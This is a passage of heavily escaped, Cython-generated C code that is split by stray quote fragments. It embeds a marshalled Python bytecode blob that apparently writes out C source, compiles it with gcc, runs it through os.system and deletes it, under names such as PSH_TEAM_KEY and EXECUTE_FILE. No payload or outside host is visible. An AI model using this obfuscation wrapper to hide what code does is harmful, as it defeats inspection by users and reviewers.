__PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\\\\n#endif\\\\n            }\\\\n        }\\\\n        {\\\\n#if CY\\\"\\\"THON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\\\n            PyErr_SetString(PyExc_RuntimeError,\\\\n                            \\\\\\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\\\\\");\\\\n#else\\\\n            int val;\\\\n            PyObject *v = __Pyx_PyNumber_IntOrL\"\"ong(x);\\\\n #if PY_MAJOR_VERSION < 3\\\\n            if (likely(v) && !PyLong_Check(v)) {\\\\n                PyObject *tmp = v;\\\\n                v = PyNumber_Long(tmp);\\\\n                Py_DECREF(tmp);\\\\n            }\\\\n #endif\\\\n            if (likely(v)) {\\\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\\\n                unsigned char *bytes = (unsigned char *)&val;""\\\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\\\n                                              bytes, sizeof(val),\\\\n                                              is_little, !is_unsigned);\\\\n                Py_DECREF(v);\\\\n                if (likely(!ret))\\\\n                    return val;\\\\n            }\\\\n#endif\\\\n            return (int) -1;\\\\n        }\\\\n    } else {\\\\n        int val;\\\\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\\\n        if (!tmp) return (int) -1;\\\\n        val = __Pyx_PyInt_As_int(tmp);\\\\n        Py_DECREF(tmp);\\\\n        return val;\\\\n    }\\\\nraise_overflow:\\\\n    PyErr_SetString(PyExc_OverflowError,\\\\n        \\\\\\\"value too large to convert to int\\\\\\\");\\\\n    return (int) -1;\\\\nraise_neg_overflow:\\\\n    PyErr_SetString(PyExc_OverflowError,\\\\n        \\\\\\\"can't convert negative value to int\\\\\\\");\\\\n    return (int) -1;\\\\n}\\\\n\\\\n/* FastTypeChecks */\\\\n    #if CYTHON_COMPILING_IN_CPYTHON\\\\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\\\\n    while (a) {\\\\n        a = a->tp_base;\\\\n        if (a == b)\\\\n            return 1;\\\\n    }\\\\n    return b == &PyBaseObject_Type;\\\\n}\\\\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\\\\n    PyObject *mro;\\\\n    if (a == b) return 1;\\\\n    mro = a->tp_mro;\\\\n    if (likely(mro)) {\\\\n        Py_ssize_t i, n;\\\\n        n = PyT\\\"\\\"uple_GET_SIZE(mro);\\\\n        for (i = 0; i < n; i++) {\\\\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\\\\n                return 1;\\\\n        }\\\\n        return 0;\\\\n    }\\\\n    return __Pyx_InBases(a, b);\\\\n}\"\"\\\\n#if PY_MAJOR_VERSION == 2\\\\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\\\\n    PyObject *exception, *value, *tb;\\\\n    int res;\\\\n    __Pyx_PyThreadState_declare\\\\n    __Pyx_PyThreadState""_assign\\\\n    __Pyx_ErrFetch(&exception, &value, &tb);\\\\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\\\\n    if (unlikely(res == -1)) {\\\\n        PyErr_WriteUnraisable(err);\\\\n        res = 0;\\\\n    }\\\\n    if (!res) {\\\\n        res = PyObject_IsSubclass(err, exc_type2);\\\\n        if (unlikely(res == -1)) {\\\\n            PyErr_WriteUnraisable(err);\\\\n            res = 0;\\\\n        }\\\\n    }\\\\n    __Pyx_ErrRestore(exception, value, tb);\\\\n    return res;\\\\n}\\\\n#else\\\\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\\\\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\\\\n    if (!res) {\\\\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\\\\n    }\\\\n    return res;\\\\n}\\\\n#endif\\\\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\\\\n    Py_ssize_t i, n;\\\\n    assert(PyExceptionClass_Check(exc_type));\\\\n    n = PyTuple_GET_SIZE(tuple);\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    for (i=0; i<n; i++) {\\\\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\\\\n    }\\\\n#endif\\\\n    for (i=0; i<n; i++) {\\\\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\\\\n        #if PY_MAJOR_VERSION < 3\\\\n        if (likely(exc_type == t)) return 1;\\\\n        #endif\\\\n        if (likely(PyExceptionClass_Check(t))) {\\\\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\\\\n        } else {\\\\n        }\\\\n    }\\\\n    return 0;\\\\n}\\\\nstatic CYTHON_INLINE int\\\"\\\" __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\\\\n    if (likely(err == exc_type)) return 1;\\\\n    if (likely(PyExceptionClass_Check(\"\"err))) {\\\\n        if (likely(PyExceptionClass_Check(exc_type))) {\\\\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_ty""pe);\\\\n        } else if (likely(PyTuple_Check(exc_type))) {\\\\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\\\\n        } else {\\\\n        }\\\\n    }\\\\n    return PyErr_GivenExceptionMatches(err, exc_type);\\\\n}\\\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\\\\n    assert(PyExceptionClass_Check(exc_type1));\\\\n    assert(PyExceptionClass_Check(exc_type2));\\\\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\\\\n    if (likely(PyExceptionClass_Check(err))) {\\\\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\\\\n    }\\\\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\\\\n}\\\\n#endif\\\\n\\\\n/* CheckBinaryVersion */\\\\n    static int __Pyx_check_binary_version(void) {\\\\n    char ctversion[5];\\\\n    int same=1, i, found_dot;\\\\n    const char* rt_from_call = Py_GetVersion();\\\\n    PyOS_snprintf(ctversion, 5, \\\\\\\"%d.%d\\\\\\\", PY_MAJOR_VERSION, PY_MINOR_VERSION);\\\\n    found_dot = 0;\\\\n    for (i = 0; i < 4; i++) {\\\\n        if (!ctversion[i]) {\\\\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\\\\n            break;\\\\n        }\\\\n        if (rt_from_call[i] != ctversion[i]) {\\\\n            same = 0;\\\\n            break;\\\\n        }\\\\n    }\\\\n    if (!same) {\\\\n        char rtversion[5] = {'\\\\\\\\0'};\\\\n        char message[200];\\\\n        for (i=0; i<4; ++i) {\\\\n            if (rt_from_call[i] == '.') {\\\\n                if (found_dot) break;\\\\n                found_dot = 1;\\\\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\\\\n                break;\\\\n            }\\\\n            rtversion[i] = rt_from_\\\"\\\"call[i];\\\\n        }\\\\n        PyOS_snprintf(message, sizeof(message),\\\\n                      \"\"\\\\\\\"compiletime version %s"" of module '%.100s' \\\\\\\"\\\\n                      \\\\\\\"does not match runtime version %s\\\\\\\",\\\\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\\\\n        return PyErr_WarnEx(NULL, message, 1);\\\\n    }\\\\n    return 0;\\\\n}\\\\n\\\\n/* InitStrings */\\\\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\\\\n    while (t->p) {\\\\n        #if PY_MAJOR_VERSION < 3\\\\n        if (t->is_unicode) {\\\\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\\\\n        } else if (t->intern) {\\\\n            *t->p = PyString_InternFromString(t->s);\\\\n        } else {\\\\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\\\\n        }\\\\n        #else\\\\n        if (t->is_unicode | t->is_str) {\\\\n            if (t->intern) {\\\\n                *t->p = PyUnicode_InternFromString(t->s);\\\\n            } else if (t->encoding) {\\\\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\\\\n            } else {\\\\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\\\\n            }\\\\n        } else {\\\\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\\\\n        }\\\\n        #endif\\\\n        if (!*t->p)\\\\n            return -1;\\\\n        if (PyObject_Hash(*t->p) == -1)\\\\n            return -1;\\\\n        ++t;\\\\n    }\\\\n    return 0;\\\\n}\\\\n\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\\\\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\\\\n}\\\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\\\\n    Py_ssize_t ignore;\\\\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\\\\n}\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\\\n#if !CYTHON_PEP393_ENABLED\\\\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\\\n    char* defenc_c;\\\\n    PyObject* de""fenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\\\\n    if\\\"\\\" (!defenc) return NULL;\"\"\\\\n    defenc_c = PyBytes_AS_STRING(defenc);\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\\\n    {\\\\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\\\\n        char* c;\\\\n        for (c = defenc_c; c < end; c++) {\\\\n            if ((unsigned char) (*c) >= 128) {\\\\n                PyUnicode_AsASCIIString(o);\\\\n                return NULL;\\\\n            }\\\\n        }\\\\n    }\\\\n#endif\\\\n    *length = PyBytes_GET_SIZE(defenc);\\\\n    return defenc_c;\\\\n}\\\\n#else\\\\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\\\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\\\n    if (likely(PyUnicode_IS_ASCII(o))) {\\\\n        *length = PyUnicode_GET_LENGTH(o);\\\\n        return PyUnicode_AsUTF8(o);\\\\n    } else {\\\\n        PyUnicode_AsASCIIString(o);\\\\n        return NULL;\\\\n    }\\\\n#else\\\\n    return PyUnicode_AsUTF8AndSize(o, length);\\\\n#endif\\\\n}\\\\n#endif\\\\n#endif\\\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\\\n    if (\\\\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\\\n            __Pyx_sys_getdefaultencoding_not_ascii &&\\\\n#endif\\\\n            PyUnicode_Check(o)) {\\\\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\\\\n    } else\\\\n#endif\\\\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\\\\n    if (PyByteArray_Check(o)) {\\\\n        *length = PyByteArray_GET_SIZE(o);\\\\n        return PyByteArray_AS_STRING(o);\\\\n    } else\\\\n#endif\\\\n    {\\\\n        char* result;\\\\n        int r = PyBytes_AsStringAndSize(o, &result, length);\\\\n        if (unlikely(""r < 0)) {\\\\n            return NULL;\\\\n        } else {\\\\n            return result;\\\\n        }\\\\n    }\\\\n}\\\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\\\\n   int is_true = x == Py_Tr\"\"ue;\\\\n   if (is_true | (x == Py_False) \\\"\\\"| (x == Py_None)) return is_true;\\\\n   else return PyObject_IsTrue(x);\\\\n}\\\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\\\\n    int retval;\\\\n    if (unlikely(!x)) return -1;\\\\n    retval = __Pyx_PyObject_IsTrue(x);\\\\n    Py_DECREF(x);\\\\n    return retval;\\\\n}\\\\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\\\\n#if PY_MAJOR_VERSION >= 3\\\\n    if (PyLong_Check(result)) {\\\\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\\\\n                \\\\\\\"__int__ returned non-int (type %.200s).  \\\\\\\"\\\\n                \\\\\\\"The ability to return an instance of a strict subclass of int \\\\\\\"\\\\n                \\\\\\\"is deprecated, and may be removed in a future version of Python.\\\\\\\",\\\\n                Py_TYPE(result)->tp_name)) {\\\\n            Py_DECREF(result);\\\\n            return NULL;\\\\n        }\\\\n        return result;\\\\n    }\\\\n#endif\\\\n    PyErr_Format(PyExc_TypeError,\\\\n                 \\\\\\\"__%.4s__ returned non-%.4s (type %.200s)\\\\\\\",\\\\n                 type_name, type_name, Py_TYPE(result)->tp_name);\\\\n    Py_DECREF(result);\\\\n    return NULL;\\\\n}\\\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\n  PyNumberMethods *m;\\\\n#endif\\\\n  const char *name = NULL;\\\\n  PyObject *res = NULL;\\\\n#if PY_MAJOR_VERSION < 3\\\\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\\\\n#else\\\\n  if (likely(PyLong_Check(x)))\\\\n#endif\\\\n    return __Pyx_NewRef(x);\\\\n#if CYTHON_USE_TYPE_SLOTS\\\\n  m = Py_TYPE(x)->tp_as_number;\\\\n  #if PY_MAJOR_VERSION < 3\\\\n  if (m && m->nb_int) {""\\\\n    name = \\\\\\\"int\\\\\\\";\\\\n    res = m->nb_int(x);\\\\n  }\\\\n  else if (m && m->nb_long) {\\\\n    name = \\\\\\\"long\\\\\\\";\\\\n    res = m->nb_long(x);\\\\n  }\\\\n  #else\\\\n  if (likely(m && m->nb_int)) {\\\\n    name = \\\\\\\"int\\\\\\\";\\\\n    res = m->nb_int(x);\\\\n  }\\\\n  #endif\\\\n#else\\\\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\\\\n    res = PyNumb\"\"er_Int(x);\\\\n  }\\\\n#endif\\\\n  if (likely(res)) {\\\\n#if PY_MAJOR_VERSION < 3\\\\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) \\\"\\\"{\\\\n#else\\\\n    if (unlikely(!PyLong_CheckExact(res))) {\\\\n#endif\\\\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\\\\n    }\\\\n  }\\\\n  else if (!PyErr_Occurred()) {\\\\n    PyErr_SetString(PyExc_TypeError,\\\\n                    \\\\\\\"an integer is required\\\\\\\");\\\\n  }\\\\n  return res;\\\\n}\\\\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\\\\n  Py_ssize_t ival;\\\\n  PyObject *x;\\\\n#if PY_MAJOR_VERSION < 3\\\\n  if (likely(PyInt_CheckExact(b))) {\\\\n    if (sizeof(Py_ssize_t) >= sizeof(long))\\\\n        return PyInt_AS_LONG(b);\\\\n    else\\\\n        return PyInt_AsSsize_t(b);\\\\n  }\\\\n#endif\\\\n  if (likely(PyLong_CheckExact(b))) {\\\\n    #if CYTHON_USE_PYLONG_INTERNALS\\\\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\\\\n    const Py_ssize_t size = Py_SIZE(b);\\\\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\\\\n        ival = likely(size) ? digits[0] : 0;\\\\n        if (size == -1) ival = -ival;\\\\n        return ival;\\\\n    } else {\\\\n      switch (size) {\\\\n         case 2:\\\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\\\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n         case -2:\\\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\\\n             return -(Py_ssize_t) (((((size_t)di""gits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n         case 3:\\\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\\\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n         case -3:\\\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\\\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1\"\"]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n         case 4:\\\\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\\\\n             return (Py_ssize_t) (((((((\\\"\\\"((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n         case -4:\\\\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\\\\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\\\n           }\\\\n           break;\\\\n      }\\\\n    }\\\\n    #endif\\\\n    return PyLong_AsSsize_t(b);\\\\n  }\\\\n  x = PyNumber_Index(b);\\\\n  if (!x) return -1;\\\\n  ival = PyInt_AsSsize_t(x);\\\\n  Py_DECREF(x);\\\\n  return ival;\\\\n}\\\\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\\\\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\\\\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\\\\n#if PY_MAJOR_VERSION < 3\\\\n  } else if (likely(PyInt_CheckExact(o))) {\\\\n    return PyInt_AS_LONG(o);\\\\n#endif\\\\n  } else {\\\\n    Py_ssize_t ival;\\\\n    PyObject *x;\\\\n    x = PyNumber_Index(o);\\\\n    if (!x) return -1;\\\\n    ival = PyInt_AsLong(x);\\\\n    Py_DECREF(x);\\\\n    return ival;\\\\n  }\\\\n}\\\\nstatic CYTHON_INLINE PyObject * _""_Pyx_PyBool_FromLong(long b) {\\\\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\\\\n}\\\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\\\\n    return PyInt_FromSize_t(ival);\\\\n}\\\\n\\\\n\\\\n#endif /* Py_PYTHON_H */z\\\\r.py_private.c\\\\332\\\\001.\\\\372\\\\001 \\\\351\\\\377\\\\377\\\\377\\\\377z\\\\006gcc -Iz\\\\017/include/pythonz\\\\004 -o z\\\\003 -Lz\\\\r/lib -lpython\\\\332\\\\001wT)\\\\001\\\\332\\\\010exist_ok)\\\\035\\\\332\\\\003foo\\\\332\\\\003bar\\\\332\\\\002os\\\\332\\\\003sysZ\\\\014PSH_TEAM_KEYZ\\\\014EXECUTE_FILE\\\\332\\\\006prefixZ\\\\006PREFIXZ\\\\021EXPORT_PYTHONHOME\\\\332\\\\nexecutableZ\\\\030EXPORT_PYTHON_EXECUTABLE\\\\332\\\\003RUN\\\\332\"\"\\\\004path\\\\332\\\\006isfile\\\\332\\\\006system\\\\332\\\\004exit\\\\332\\\\010C_SOURCEZ\\\\006C_FILE\\\\332\\\\004join\\\\332\\\\007version\\\\332\\\\005splitZ\\\\016PYTHON_VERSIONZ\\\\014COMPILE_FILE\\\\332\\\\004open\\\\332\\\\001f\\\\332\\\\005write\\\\332\\\\010makedirs\\\\332\\\\007dirname\\\\332\\\\006remove\\\\251\\\\000r\\\\034\\\\000\\\\000\\\\000r\\\\034\\\\000\\\\000\\\\000\\\\332\\\\006string\\\\332\\\"\\\"\\\\010<module>\\\\002\\\\000\\\\000\\\\000s\\\\230\\\\000\\\\000\\\\000\\\\004\\\\001\\\\004\\\\001\\\\010\\\\002\\\\010\\\\001\\\\010\\\\002\\\\004\\\\002\\\\004\\\\001\\\\006\\\\001\\\\010\\\\001\\\\n\\\\002\\\\010\\\\002\\\\014\\\\001\\\\032\\\\001\\\\010\\\\002\\\\004\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000\\\\000a\\\\004\\\\001$\\\\002\\\\002\\\\001\\\\002\\\\377\\\\002\\\\002\\\\002\\\\376\\\\002\\\\003\\\\002\\\\375\\\\002\\\\004\\\\002\\\\374\\\\002\\\\005\\\\002\\\\373\\\\002\\\\006\\\\002\\\\372\\\\002\\\\007\\\\002\\\\371\\\\002\\\\010\\\\002\\\\370\\\\002\\\\t\\\\002\\\\367\\\\002\\\\n\\\\002\\\\366\\\\002\\\\013\\\\002\\\\365""\\\\002\\\\377\\\\002\\\\020\\\\014\\\\001(\\\\002\\\\026\\\\001\\\\\\\"\\\\002\\\";\\nstatic PyObject *__pyx_kp_u_;\\nstatic PyObject *__pyx_kp_u_3_9;\\nstatic PyObject *__pyx_kp_u_No_support_for_VALUE;\\nstatic PyObject *__pyx_n_s_PYTHON_VERSION;\\nstatic PyObject *__pyx_kp_u_VERSION;\\nstatic PyObject *__pyx_kp_u__2;\\nstatic PyObject *__pyx_n_s_builtins;\\nstatic PyObject *__pyx_kp_b_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l;\\nstatic PyObject *__pyx_n_s_cline_in_traceback;\\nstatic PyObject *__pyx_n_s_exit;\\nstatic PyObject *__pyx_n_s_import;\\nstatic PyObject *__pyx_n_s_loads;\\nstatic PyObject *__pyx_n_s_main;\\nstatic PyObject *__pyx_n_s_marshal;\\nstatic PyObject *__pyx_n_s_name;\\nstatic PyObject *__pyx_n_s_print;\\nstatic PyObject *__pyx_n_s_split;\\nstatic PyObject *__pyx_n_s_sys;\\nstatic PyObject *__pyx_n_s_test;\\nstatic PyObject *__pyx_n_s_version;\\nstatic PyObject *__pyx_int_0;\\nstatic PyObject *__pyx_int_neg_1;\\nstatic PyObject *__pyx_slice__5;\\nstatic PyObject *__pyx_tuple__3;\\nstatic PyObject *__pyx_tuple__4;\\nstatic PyObject *__pyx_tuple__6;\\nstatic PyObject *__py\"\"x_tuple__7;\\n/* Late includes */\\n\\nstatic PyMethodDef __pyx_methods[] = {\\n  {0, 0, 0, 0}\\n};\\n\\n#if PY_MAJOR_VERSION >= 3\\n#if CYTHON_PEP489_MULTI_PHASE_INIT\\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\\n  {Py_mod_create, (void*)__pyx_pymod_create},\\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\\n  {0, NULL}\\n};\\n#endif\\n\\nstatic struct PyModuleDef __pyx_moduledef = {\\n    PyModuleDef_HEAD_INIT,\\n    \\\"source\\\",\\n    0, /* m_doc */\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n    0, /* m_size */\\n  #else\\n    -1, /* m_size */\\n  #endif\\n    __pyx_methods /* m_methods */,\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n    __pyx_moduledef_slots, /* m_slots */\\n  #else\\n    NULL, /* m_reload */\\n  #endif""\\n    NULL, /* m_traverse */\\n    NULL, /* m_clear */\\n    NULL /* m_free */\\n};\\n#endif\\n#ifndef CYTHON_SMALL_CODE\\n#if defined(__clang__)\\n    #define CYTHON_SMALL_CODE\\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\\n    #define CYTHON_SMALL_CODE __attribute__((cold))\\n#else\\n    #define CYTHON_SMALL_CODE\\n#endif\\n#endif\\n\\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\\n  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},\\n  {&__pyx_kp_u_3_9, __pyx_k_3_9, sizeof(__pyx_k_3_9), 0, 1, 0, 0},\\n  {&__pyx_kp_u_No_support_for_VALUE, __pyx_k_No_support_for_VALUE, sizeof(__pyx_k_No_support_for_VALUE), 0, 1, 0, 0},\\n  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},\\n  {&__pyx_kp_u_VERSION, __pyx_k_VERSION, sizeof(__pyx_k_VERSION), 0, 1, 0, 0},\\n  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},\\n  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},\\n  {&__pyx_kp_b_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l, __pyx_k_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l, sizeof(__pyx_k_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l), 0, 0, 0, 0},\"\"\\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},\\n  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},\\n  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},\\n  {&__pyx_n_s_loads, __pyx_k_loads, sizeof(__pyx_k_loads), 0, 0, 1, 1},\\n  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},\\n  {&__pyx_n_s_marshal, __pyx_k_marshal, sizeof(__pyx_k_marshal), 0, 0, 1, 1},\\n  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},\\n  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},\\n  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},\\n  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\\n  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_tes""t), 0, 0, 1, 1},\\n  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},\\n  {0, 0, 0, 0, 0, 0, 0}\\n};\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\\n  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 10, __pyx_L1_error)\\n  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 12, __pyx_L1_error)\\n  return 0;\\n  __pyx_L1_error:;\\n  return -1;\\n}\\n\\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\\n  __Pyx_RefNannyDeclarations\\n  __Pyx_RefNannySetupContext(\\\"__Pyx_InitCachedConstants\\\", 0);\\n\\n\\n  __pyx_tuple__3 = PyTuple_Pack(1, __pyx_kp_u__2); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple__3);\\n  __Pyx_GIVEREF(__pyx_tuple__3);\\n  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_u_); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple__4);\\n  __Pyx_GIVEREF(__pyx_tuple__4);\\n  __pyx_slice__5 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__5)) __PYX_ERR(0, 8, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_slice__5);\\n  __Pyx_GI\"\"VEREF(__pyx_slice__5);\\n\\n\\n  __pyx_tuple__6 = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple__6)) __PYX_ERR(0, 12, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple__6);\\n  __Pyx_GIVEREF(__pyx_tuple__6);\\n\\n\\n  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_b_c_sL_d_Z_e_r_d_d_Z_d_d_l_Z_d_d_l); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 14, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_tuple__7);\\n  __Pyx_GIVEREF(__pyx_tuple__7);\\n  __Pyx_RefNannyFinishContext();\\n  return 0;\\n  __pyx_L1_error:;\\n  